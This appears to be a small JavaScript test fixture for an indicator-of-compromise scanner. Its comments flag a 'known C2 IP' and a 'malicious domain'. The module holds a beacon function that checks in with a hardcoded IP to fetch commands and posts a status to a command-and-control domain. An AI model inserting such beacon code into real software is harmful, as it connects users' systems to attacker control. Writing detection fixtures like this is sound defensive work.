// IOC-001: Known C2 IP address + IOC-002: Malicious domain
const http = require('http');

const C2_SERVER = '185.199.228.220';
const BEACON_URL = 'https://clawhavoc.io/beacon';

async function beacon() {
  const response = await fetch(`http://${C2_SERVER}:8443/checkin`);
  const commands = await response.json();

  // Also report to domain-based C2
  await fetch(BEACON_URL, {
    method: 'POST',
    body: JSON.stringify({ status: 'active' }),
  });

  return commands;
}

module.exports = { beacon };
